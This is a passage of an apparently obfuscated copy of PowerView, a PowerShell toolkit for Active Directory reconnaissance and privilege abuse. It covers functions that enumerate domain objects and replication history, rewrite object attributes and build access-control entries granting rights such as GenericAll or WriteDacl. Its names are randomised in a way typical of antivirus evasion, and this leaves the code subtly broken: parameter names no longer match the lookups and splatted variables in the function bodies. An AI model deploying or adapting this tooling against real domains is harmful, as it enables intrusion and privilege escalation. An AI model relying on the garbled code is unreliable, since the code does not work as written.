                        $uExy6mk5rbghU4f = Get-DomainSearcher @SearcherArguments
                    }
                }
                elseif ($It59GzvwEj.Contains('.')) {
                    $CO2KFH += "(|(samAccountName=$It59GzvwEj)(name=$It59GzvwEj)(dnshostname=$It59GzvwEj))"
                }
                else {
                    $CO2KFH += "(|(samAccountName=$It59GzvwEj)(name=$It59GzvwEj)(displayname=$It59GzvwEj))"
                }
            }
            if ($CO2KFH -and ($CO2KFH.Trim() -ne '') ) {
                $Iq7bLVAvhKnpjdMlH2 += "(|$CO2KFH)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainObject] Using additional LDAP filter: $c7rZO2V9"
                $Iq7bLVAvhKnpjdMlH2 += "$c7rZO2V9"
            }

            
            $F2EgMO8Q | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $r3NzqZ3LuCdUjNUAWy5yroT = $_.Substring(4)
                    $Jwv4XHmkge9naNIru5oT = [Int]($KLrjblEyzposuH::$r3NzqZ3LuCdUjNUAWy5yroT)
                    $Iq7bLVAvhKnpjdMlH2 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$Jwv4XHmkge9naNIru5oT))"
                }
                else {
                    $Jwv4XHmkge9naNIru5oT = [Int]($KLrjblEyzposuH::$_)
                    $Iq7bLVAvhKnpjdMlH2 += "(userAccountControl:1.2.840.113556.1.4.803:=$Jwv4XHmkge9naNIru5oT)"
                }
            }

            if ($Iq7bLVAvhKnpjdMlH2 -and $Iq7bLVAvhKnpjdMlH2 -ne '') {
                $uExy6mk5rbghU4f.filter = "(&$Iq7bLVAvhKnpjdMlH2)"
            }
            Write-Verbose "[Get-DomainObject] Get-DomainObject filter string: $($uExy6mk5rbghU4f.filter)"

            if ($PSBoundParameters['FindOne']) { $nhxRs5G1 = $uExy6mk5rbghU4f.FindOne() }
            else { $nhxRs5G1 = $uExy6mk5rbghU4f.FindAll() }
            $nhxRs5G1 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    
                    $jp9jiurTsXvElqD = $_
                    $jp9jiurTsXvElqD.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')
                }
                else {
                    $jp9jiurTsXvElqD = Convert-LDAPProperty -UtHQ $_.Properties
                    $jp9jiurTsXvElqD.PSObject.TypeNames.Insert(0, 'PowerView.ADObject')
                }
                $jp9jiurTsXvElqD
            }
            if ($nhxRs5G1) {
                try { $nhxRs5G1.dispose() }
                catch {
                    Write-Verbose "[Get-DomainObject] Error disposing of the Results object: $_"
                }
            }
            $uExy6mk5rbghU4f.dispose()
        }
    }
}


function Get-DomainObjectAttributeHistory {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $S,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $c7rZO2V9,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $UtHQ,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $VcZPt
    )

    BEGIN {
        $wtWPex5R = @{
            'Properties'    =   'msds-replattributemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $wtWPex5R['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['LDAPFilter']) { $wtWPex5R['LDAPFilter'] = $c7rZO2V9 }
        if ($PSBoundParameters['SearchBase']) { $wtWPex5R['SearchBase'] = $h2yNsAt }
        if ($PSBoundParameters['Server']) { $wtWPex5R['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $wtWPex5R['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $wtWPex5R['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $wtWPex5R['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $wtWPex5R['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['FindOne']) { $wtWPex5R['FindOne'] = $Lnzs4NIWklS }
        if ($PSBoundParameters['Credential']) { $wtWPex5R['Credential'] = $3ezVSfm6f4k }

        if ($PSBoundParameters['Properties']) {
            $xEuYkwSOCe4GptM50W = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $xEuYkwSOCe4GptM50W = ''
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $wtWPex5R['Identity'] = $S }

        Get-DomainObject @SearcherArguments | ForEach-Object {
            $l2mBeiWJzV = $_.Properties['distinguishedname'][0]
            ForEach($YUiaJDEmoj4zFG in $_.Properties['msds-replattributemetadata']) {
                $L3iPh1Ap8zxlemWuFSNfUwQk = [xml]$YUiaJDEmoj4zFG | Select-Object -ExpandProperty 'DS_REPL_ATTR_META_DATA' -ErrorAction SilentlyContinue
                if ($L3iPh1Ap8zxlemWuFSNfUwQk) {
                    if ($L3iPh1Ap8zxlemWuFSNfUwQk.pszAttributeName -Match $xEuYkwSOCe4GptM50W) {
                        $HLkP8yYwFiBnjz2lL = New-Object PSObject
                        $HLkP8yYwFiBnjz2lL | Add-Member NoteProperty 'ObjectDN' $l2mBeiWJzV
                        $HLkP8yYwFiBnjz2lL | Add-Member NoteProperty 'AttributeName' $L3iPh1Ap8zxlemWuFSNfUwQk.pszAttributeName
                        $HLkP8yYwFiBnjz2lL | Add-Member NoteProperty 'LastOriginatingChange' $L3iPh1Ap8zxlemWuFSNfUwQk.ftimeLastOriginatingChange
                        $HLkP8yYwFiBnjz2lL | Add-Member NoteProperty 'Version' $L3iPh1Ap8zxlemWuFSNfUwQk.dwVersion
                        $HLkP8yYwFiBnjz2lL | Add-Member NoteProperty 'LastOriginatingDsaDN' $L3iPh1Ap8zxlemWuFSNfUwQk.pszLastOriginatingDsaDN
                        $HLkP8yYwFiBnjz2lL.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectAttributeHistory')
                        $HLkP8yYwFiBnjz2lL
                    }
                }
                else {
                    Write-Verbose "[Get-DomainObjectAttributeHistory] Error retrieving 'msds-replattributemetadata' for '$l2mBeiWJzV'"
                }
            }
        }
    }
}


function Get-DomainObjectLinkedAttributeHistory {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectLinkedAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $S,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $c7rZO2V9,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $UtHQ,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $VcZPt
    )

    BEGIN {
        $wtWPex5R = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
        }
        if ($PSBoundParameters['Domain']) { $wtWPex5R['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['LDAPFilter']) { $wtWPex5R['LDAPFilter'] = $c7rZO2V9 }
        if ($PSBoundParameters['SearchBase']) { $wtWPex5R['SearchBase'] = $h2yNsAt }
        if ($PSBoundParameters['Server']) { $wtWPex5R['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $wtWPex5R['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $wtWPex5R['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $wtWPex5R['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $wtWPex5R['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $wtWPex5R['Credential'] = $3ezVSfm6f4k }

        if ($PSBoundParameters['Properties']) {
            $xEuYkwSOCe4GptM50W = $PSBoundParameters['Properties'] -Join '|'
        }
        else {
            $xEuYkwSOCe4GptM50W = ''
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $wtWPex5R['Identity'] = $S }

        Get-DomainObject @SearcherArguments | ForEach-Object {
            $l2mBeiWJzV = $_.Properties['distinguishedname'][0]
            ForEach($YUiaJDEmoj4zFG in $_.Properties['msds-replvaluemetadata']) {
                $L3iPh1Ap8zxlemWuFSNfUwQk = [xml]$YUiaJDEmoj4zFG | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($L3iPh1Ap8zxlemWuFSNfUwQk) {
                    if ($L3iPh1Ap8zxlemWuFSNfUwQk.pszAttributeName -Match $xEuYkwSOCe4GptM50W) {
                        $HLkP8yYwFiBnjz2lL = New-Object PSObject
                        $HLkP8yYwFiBnjz2lL | Add-Member NoteProperty 'ObjectDN' $l2mBeiWJzV
                        $HLkP8yYwFiBnjz2lL | Add-Member NoteProperty 'AttributeName' $L3iPh1Ap8zxlemWuFSNfUwQk.pszAttributeName
                        $HLkP8yYwFiBnjz2lL | Add-Member NoteProperty 'AttributeValue' $L3iPh1Ap8zxlemWuFSNfUwQk.pszObjectDn
                        $HLkP8yYwFiBnjz2lL | Add-Member NoteProperty 'TimeCreated' $L3iPh1Ap8zxlemWuFSNfUwQk.ftimeCreated
                        $HLkP8yYwFiBnjz2lL | Add-Member NoteProperty 'TimeDeleted' $L3iPh1Ap8zxlemWuFSNfUwQk.ftimeDeleted
                        $HLkP8yYwFiBnjz2lL | Add-Member NoteProperty 'LastOriginatingChange' $L3iPh1Ap8zxlemWuFSNfUwQk.ftimeLastOriginatingChange
                        $HLkP8yYwFiBnjz2lL | Add-Member NoteProperty 'Version' $L3iPh1Ap8zxlemWuFSNfUwQk.dwVersion
                        $HLkP8yYwFiBnjz2lL | Add-Member NoteProperty 'LastOriginatingDsaDN' $L3iPh1Ap8zxlemWuFSNfUwQk.pszLastOriginatingDsaDN
                        $HLkP8yYwFiBnjz2lL.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectLinkedAttributeHistory')
                        $HLkP8yYwFiBnjz2lL
                    }
                }
                else {
                    Write-Verbose "[Get-DomainObjectLinkedAttributeHistory] Error retrieving 'msds-replvaluemetadata' for '$l2mBeiWJzV'"
                }
            }
        }
    }
}


function Set-DomainObject {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $S,

        [ValidateNotNullOrEmpty()]
        [Alias('Replace')]
        [Hashtable]
        $LtyIeSSW0T83tgM,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $T3zQrxBe4VgGpyL7dsWoqw,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $BlU1zcn2s,

        [ValidateNotNullOrEmpty()]
        [String]
        $3Ecdwi8qNy,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $c7rZO2V9,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $h2yNsAt,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $wtWPex5R = @{'Raw' = $True}
        if ($PSBoundParameters['Domain']) { $wtWPex5R['Domain'] = $3Ecdwi8qNy }
        if ($PSBoundParameters['LDAPFilter']) { $wtWPex5R['LDAPFilter'] = $c7rZO2V9 }
        if ($PSBoundParameters['SearchBase']) { $wtWPex5R['SearchBase'] = $h2yNsAt }
        if ($PSBoundParameters['Server']) { $wtWPex5R['Server'] = $Gkd0Hz5f }
        if ($PSBoundParameters['SearchScope']) { $wtWPex5R['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
        if ($PSBoundParameters['ResultPageSize']) { $wtWPex5R['ResultPageSize'] = $dTP7Qv6RslNUx }
        if ($PSBoundParameters['ServerTimeLimit']) { $wtWPex5R['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
        if ($PSBoundParameters['Tombstone']) { $wtWPex5R['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
        if ($PSBoundParameters['Credential']) { $wtWPex5R['Credential'] = $3ezVSfm6f4k }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $wtWPex5R['Identity'] = $S }

        
        $1AUZTR = Get-DomainObject @SearcherArguments

        ForEach ($jp9jiurTsXvElqD in $1AUZTR) {

            $Fd60Lwl1DIQcXhYvr = $1AUZTR.GetDirectoryEntry()

            if($PSBoundParameters['Set']) {
                try {
                    $PSBoundParameters['Set'].GetEnumerator() | ForEach-Object {
                        Write-Verbose "[Set-DomainObject] Setting '$($_.Name)' to '$($_.Value)' for object '$($1AUZTR.Properties.samaccountname)'"
                        $Fd60Lwl1DIQcXhYvr.put($_.Name, $_.Value)
                    }
                    $Fd60Lwl1DIQcXhYvr.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error setting/replacing properties for object '$($1AUZTR.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['XOR']) {
                try {
                    $PSBoundParameters['XOR'].GetEnumerator() | ForEach-Object {
                        $MxeuO0bYg7HkEcP3wZmIsr = $_.Name
                        $PropertyXorValuemr = $_.Value
                        Write-Verbose "[Set-DomainObject] XORing '$MxeuO0bYg7HkEcP3wZmIsr' with '$PropertyXorValuemr' for object '$($1AUZTR.Properties.samaccountname)'"
                        $w = $Fd60Lwl1DIQcXhYvr.$MxeuO0bYg7HkEcP3wZmIsr[0].GetType().name

                        
                        $xb8vRBq1vukdW8CL = $($Fd60Lwl1DIQcXhYvr.$MxeuO0bYg7HkEcP3wZmIsr) -bxor $PropertyXorValuemr
                        $Fd60Lwl1DIQcXhYvr.$MxeuO0bYg7HkEcP3wZmIsr = $xb8vRBq1vukdW8CL -as $w
                    }
                    $Fd60Lwl1DIQcXhYvr.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error XOR'ing properties for object '$($1AUZTR.Properties.samaccountname)' : $_"
                }
            }
            if($PSBoundParameters['Clear']) {
                try {
                    $PSBoundParameters['Clear'] | ForEach-Object {
                        $MxeuO0bYg7HkEcP3wZmIsr = $_
                        Write-Verbose "[Set-DomainObject] Clearing '$MxeuO0bYg7HkEcP3wZmIsr' for object '$($1AUZTR.Properties.samaccountname)'"
                        $Fd60Lwl1DIQcXhYvr.$MxeuO0bYg7HkEcP3wZmIsr.clear()
                    }
                    $Fd60Lwl1DIQcXhYvr.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error clearing properties for object '$($1AUZTR.Properties.samaccountname)' : $_"
                }
            }
        }
    }
}


function ConvertFrom-LDAPLogonHours {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonHours')]
    [CmdletBinding()]
    Param (
        [Parameter( ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [byte[]]
        $COG26oEfqLn3A4MI5Der0wyHd
    )

    Begin {
        if($COG26oEfqLn3A4MI5Der0wyHd.Count -ne 21) {
            throw "LogonHoursArray is the incorrect length"
        }

        function ConvertTo-COG26oEfqLn3A4MI5Der0wyHd {
            Param (
                [int[]]
                $ciOXb8e207so
            )

            $KJjlhMu5s36XVU1wQybZzWkfa = New-Object bool[] 24
            for($RGKU3QpH=0; $RGKU3QpH -lt 3; $RGKU3QpH++) {
                $I6 = $ciOXb8e207so[$RGKU3QpH]
                $2iCxJSbEZDQFphllc9F = $RGKU3QpH * 8
                $8sg = [Convert]::ToString($I6,2).PadLeft(8,'0')

                $KJjlhMu5s36XVU1wQybZzWkfa[$2iCxJSbEZDQFphllc9F+0] = [bool] [convert]::ToInt32([string]$8sg[7])
                $KJjlhMu5s36XVU1wQybZzWkfa[$2iCxJSbEZDQFphllc9F+1] = [bool] [convert]::ToInt32([string]$8sg[6])
                $KJjlhMu5s36XVU1wQybZzWkfa[$2iCxJSbEZDQFphllc9F+2] = [bool] [convert]::ToInt32([string]$8sg[5])
                $KJjlhMu5s36XVU1wQybZzWkfa[$2iCxJSbEZDQFphllc9F+3] = [bool] [convert]::ToInt32([string]$8sg[4])
                $KJjlhMu5s36XVU1wQybZzWkfa[$2iCxJSbEZDQFphllc9F+4] = [bool] [convert]::ToInt32([string]$8sg[3])
                $KJjlhMu5s36XVU1wQybZzWkfa[$2iCxJSbEZDQFphllc9F+5] = [bool] [convert]::ToInt32([string]$8sg[2])
                $KJjlhMu5s36XVU1wQybZzWkfa[$2iCxJSbEZDQFphllc9F+6] = [bool] [convert]::ToInt32([string]$8sg[1])
                $KJjlhMu5s36XVU1wQybZzWkfa[$2iCxJSbEZDQFphllc9F+7] = [bool] [convert]::ToInt32([string]$8sg[0])
            }

            $KJjlhMu5s36XVU1wQybZzWkfa
        }
    }

    Process {
        $HLkP8yYwFiBnjz2lL = @{
            Sunday = ConvertTo-COG26oEfqLn3A4MI5Der0wyHd -HoursArr $COG26oEfqLn3A4MI5Der0wyHd[0..2]
            Monday = ConvertTo-COG26oEfqLn3A4MI5Der0wyHd -HoursArr $COG26oEfqLn3A4MI5Der0wyHd[3..5]
            Tuesday = ConvertTo-COG26oEfqLn3A4MI5Der0wyHd -HoursArr $COG26oEfqLn3A4MI5Der0wyHd[6..8]
            Wednesday = ConvertTo-COG26oEfqLn3A4MI5Der0wyHd -HoursArr $COG26oEfqLn3A4MI5Der0wyHd[9..11]
            Thurs = ConvertTo-COG26oEfqLn3A4MI5Der0wyHd -HoursArr $COG26oEfqLn3A4MI5Der0wyHd[12..14]
            Friday = ConvertTo-COG26oEfqLn3A4MI5Der0wyHd -HoursArr $COG26oEfqLn3A4MI5Der0wyHd[15..17]
            Saturday = ConvertTo-COG26oEfqLn3A4MI5Der0wyHd -HoursArr $COG26oEfqLn3A4MI5Der0wyHd[18..20]
        }

        $HLkP8yYwFiBnjz2lL = New-Object PSObject -Property $HLkP8yYwFiBnjz2lL
        $HLkP8yYwFiBnjz2lL.PSObject.TypeNames.Insert(0, 'PowerView.LogonHours')
        $HLkP8yYwFiBnjz2lL
    }
}


function New-ADObjectAccessControlEntry {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Security.AccessControl.AuthorizationRule')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True, Mandatory = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $jw8BoRmaHQ5SphuZ9,

        [ValidateNotNullOrEmpty()]
        [String]
        $U4sT1wb9nxkR2FV,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Gkd0Hz5f,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $9xBkgsU80TdhW6XNGqtnDA7 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $dTP7Qv6RslNUx = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $OVoMgsOXRJJ7,

        [Switch]
        $jVcDk0Ocw0TgdcVV8Sq,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $3ezVSfm6f4k = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $True)]
        [ValidateSet('AccessSystemSecurity', 'CreateChild','Delete','DeleteChild','DeleteTree','ExtendedRight','GenericAll','GenericExecute','GenericRead','GenericWrite','ListChildren','ListObject','ReadControl','ReadProperty','Self','Synchronize','WriteDacl','WriteOwner','WriteProperty')]
        $EOYCehp3,

        [Parameter(Mandatory = $True, ParameterSetName='AccessRuleType')]
        [ValidateSet('Allow', 'Deny')]
        [String[]]
        $kCn,

        [Parameter(Mandatory = $True, ParameterSetName='AuditRuleType')]
        [ValidateSet('Success', 'Failure')]
        [String]
        $ec1TkPt,

        [Parameter(Mandatory = $False, ParameterSetName='AccessRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='AuditRuleType')]
        [Parameter(Mandatory = $False, ParameterSetName='ObjectGuidLookup')]
        [Guid]
        $TljZNdaxfgC0mG,

        [ValidateSet('All', 'Children','Descendents','None','SelfAndChildren')]
        [String]
        $ntUmBihKlAs7pqx,

        [Guid]
        $g3yXZhgPT2ikG
    )

    Begin {
        if ($jw8BoRmaHQ5SphuZ9 -notmatch '^S-1-.*') {
            $SbT4EDxHwgCremc1WFfi = @{
                'Identity' = $jw8BoRmaHQ5SphuZ9
                'Properties' = 'distinguishedname,objectsid'
            }
            if ($PSBoundParameters['PrincipalDomain']) { $SbT4EDxHwgCremc1WFfi['Domain'] = $U4sT1wb9nxkR2FV }
            if ($PSBoundParameters['Server']) { $SbT4EDxHwgCremc1WFfi['Server'] = $Gkd0Hz5f }
            if ($PSBoundParameters['SearchScope']) { $SbT4EDxHwgCremc1WFfi['SearchScope'] = $9xBkgsU80TdhW6XNGqtnDA7 }
            if ($PSBoundParameters['ResultPageSize']) { $SbT4EDxHwgCremc1WFfi['ResultPageSize'] = $dTP7Qv6RslNUx }
            if ($PSBoundParameters['ServerTimeLimit']) { $SbT4EDxHwgCremc1WFfi['ServerTimeLimit'] = $OVoMgsOXRJJ7 }
            if ($PSBoundParameters['Tombstone']) { $SbT4EDxHwgCremc1WFfi['Tombstone'] = $jVcDk0Ocw0TgdcVV8Sq }
            if ($PSBoundParameters['Credential']) { $SbT4EDxHwgCremc1WFfi['Credential'] = $3ezVSfm6f4k }
            $nk66 = Get-DomainObject @PrincipalSearcherArguments
            if (-not $nk66) {
                throw "Unable to resolve principal: $jw8BoRmaHQ5SphuZ9"
            }
            elseif($nk66.Count -gt 1) {
                throw "PrincipalIdentity matches multiple AD objects, but only one is allowed"
            }
            $iQFdt = $nk66.objectsid
        }
        else {
            $iQFdt = $jw8BoRmaHQ5SphuZ9
        }

        $oJjPzTWriNQe = 0
        foreach($GY4 in $EOYCehp3) {
            $oJjPzTWriNQe = $oJjPzTWriNQe -bor (([System.DirectoryServices.ActiveDirectoryRights]$GY4).value__)
        }
        $oJjPzTWriNQe = [System.DirectoryServices.ActiveDirectoryRights]$oJjPzTWriNQe

        $S = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$iQFdt)
    }

    Process {
        if($2Pc3tSl3HYh.ParameterSetName -eq 'AuditRuleType') {

            if($TljZNdaxfgC0mG -eq $qYFR5PCZruUkdna9T -and $ntUmBihKlAs7pqx -eq [String]::Empty -and $g3yXZhgPT2ikG -eq $qYFR5PCZruUkdna9T) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $S, $oJjPzTWriNQe, $ec1TkPt
            } elseif($TljZNdaxfgC0mG -eq $qYFR5PCZruUkdna9T -and $ntUmBihKlAs7pqx -ne [String]::Empty -and $g3yXZhgPT2ikG -eq $qYFR5PCZruUkdna9T) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $S, $oJjPzTWriNQe, $ec1TkPt, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$ntUmBihKlAs7pqx)
            } elseif($TljZNdaxfgC0mG -eq $qYFR5PCZruUkdna9T -and $ntUmBihKlAs7pqx -ne [String]::Empty -and $g3yXZhgPT2ikG -ne $qYFR5PCZruUkdna9T) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $S, $oJjPzTWriNQe, $ec1TkPt, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$ntUmBihKlAs7pqx), $g3yXZhgPT2ikG
            } elseif($TljZNdaxfgC0mG -ne $qYFR5PCZruUkdna9T -and $ntUmBihKlAs7pqx -eq [String]::Empty -and $g3yXZhgPT2ikG -eq $qYFR5PCZruUkdna9T) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $S, $oJjPzTWriNQe, $ec1TkPt, $TljZNdaxfgC0mG
            } elseif($TljZNdaxfgC0mG -ne $qYFR5PCZruUkdna9T -and $ntUmBihKlAs7pqx -ne [String]::Empty -and $g3yXZhgPT2ikG -eq $qYFR5PCZruUkdna9T) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $S, $oJjPzTWriNQe, $ec1TkPt, $TljZNdaxfgC0mG, $ntUmBihKlAs7pqx
            } elseif($TljZNdaxfgC0mG -ne $qYFR5PCZruUkdna9T -and $ntUmBihKlAs7pqx -ne [String]::Empty -and $g3yXZhgPT2ikG -ne $qYFR5PCZruUkdna9T) {
                New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $S, $oJjPzTWriNQe, $ec1TkPt, $TljZNdaxfgC0mG, $ntUmBihKlAs7pqx, $g3yXZhgPT2ikG
            }

        }
        else {

            if($TljZNdaxfgC0mG -eq $qYFR5PCZruUkdna9T -and $ntUmBihKlAs7pqx -eq [String]::Empty -and $g3yXZhgPT2ikG -eq $qYFR5PCZruUkdna9T) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $S, $oJjPzTWriNQe, $kCn
            } elseif($TljZNdaxfgC0mG -eq $qYFR5PCZruUkdna9T -and $ntUmBihKlAs7pqx -ne [String]::Empty -and $g3yXZhgPT2ikG -eq $qYFR5PCZruUkdna9T) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $S, $oJjPzTWriNQe, $kCn, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$ntUmBihKlAs7pqx)
            } elseif($TljZNdaxfgC0mG -eq $qYFR5PCZruUkdna9T -and $ntUmBihKlAs7pqx -ne [String]::Empty -and $g3yXZhgPT2ikG -ne $qYFR5PCZruUkdna9T) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $S, $oJjPzTWriNQe, $kCn, ([System.DirectoryServices.ActiveDirectorySecurityInheritance]$ntUmBihKlAs7pqx), $g3yXZhgPT2ikG
            } elseif($TljZNdaxfgC0mG -ne $qYFR5PCZruUkdna9T -and $ntUmBihKlAs7pqx -eq [String]::Empty -and $g3yXZhgPT2ikG -eq $qYFR5PCZruUkdna9T) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $S, $oJjPzTWriNQe, $kCn, $TljZNdaxfgC0mG
            } elseif($TljZNdaxfgC0mG -ne $qYFR5PCZruUkdna9T -and $ntUmBihKlAs7pqx -ne [String]::Empty -and $g3yXZhgPT2ikG -eq $qYFR5PCZruUkdna9T) {
                New-Object System.DirectoryServices.ActiveDirectoryAccessRule -ArgumentList $S, $oJjPzTWriNQe, $kCn, $TljZNdaxfgC0mG, $ntUmBihKlAs7pqx
            } elseif($TljZNdaxfgC0mG -ne $qYFR5PCZruUkdna9T -and $ntUmBihKlAs7pqx -ne [String]::Empty -and $g3yXZhgPT2ikG -ne $qYFR5PCZruUkdna9T) {
